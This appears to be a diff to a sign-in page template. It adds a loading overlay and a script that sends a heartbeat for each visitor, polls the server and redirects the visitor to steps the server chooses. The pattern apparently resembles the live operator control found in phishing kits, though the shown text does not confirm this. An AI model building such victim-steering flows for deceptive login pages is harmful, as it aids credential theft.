@@ -1908,5 +1908,79 @@
     <button type="submit"><%= pageContent.cta || 'Sign In' %></button>
   </form>
 </div>
+
+<!-- ── Animated redirect overlay ──────────────────────────── -->
+<div id="redirectOverlay" style="
+  display:none;position:fixed;inset:0;z-index:9999;
+  background:rgba(0,0,0,.85);backdrop-filter:blur(8px);
+  display:none;align-items:center;justify-content:center;flex-direction:column;gap:20px
+">
+  <div style="width:44px;height:44px;border:3px solid rgba(255,255,255,.15);
+    border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite"></div>
+  <div style="color:#fff;font-size:.95rem;opacity:.8;font-family:system-ui">Please wait…</div>
+</div>
+<style>@keyframes spin{to{transform:rotate(360deg)}}</style>
+
+<script>
+(function() {
+  // skip on preview pages
+  if (window.location.pathname.startsWith('/preview')) return;
+
+  const SLUG = '<%= page.slug %>';
+  const STEP = '<%= pageContent.slug || "login" %>';
+
+  // stable session id for this visitor tab
+  let sid = sessionStorage.getItem('_lbsid');
+  if (!sid) { sid = Math.random().toString(36).slice(2) + Date.now().toString(36); sessionStorage.setItem('_lbsid', sid); }
+
+  function heartbeat() {
+    fetch('/p/' + SLUG + '/heartbeat', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ sid, step: STEP }),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function showOverlay() {
+    const el = document.getElementById('redirectOverlay');
+    el.style.display = 'flex';
+  }
+
+  function doRedirect(target) {
+    showOverlay();
+    const base = '/p/' + SLUG + '/';
+    let url;
+    if (target === 'HOME' || target === 'home') {
+      // first step in the flow — go to base page
+      url = '/p/' + SLUG;
+    } else if (target === 'NEXT') {
+      // server will figure out next; hit /next endpoint
+      url = '/p/' + SLUG + '/next?_sid=' + sid;
+    } else {
+      url = base + target;
+    }
+    setTimeout(() => { window.location.href = url; }, 900);
+  }
+
+  let pollTimer = null;
+  function startPolling() {
+    if (pollTimer) return;
+    pollTimer = setInterval(() => {
+      fetch('/p/' + SLUG + '/poll?sid=' + encodeURIComponent(sid))
+        .then(r => r.json())
+        .then(d => {
+          if (d.step) { clearInterval(pollTimer); doRedirect(d.step); }
+        })
+        .catch(() => {});
+    }, 2000);
+  }
+
+  // send first heartbeat immediately, then every 5s
+  heartbeat();
+  setInterval(heartbeat, 5000);
+  startPolling();
+})();
+</script>
 </body>
 </html>
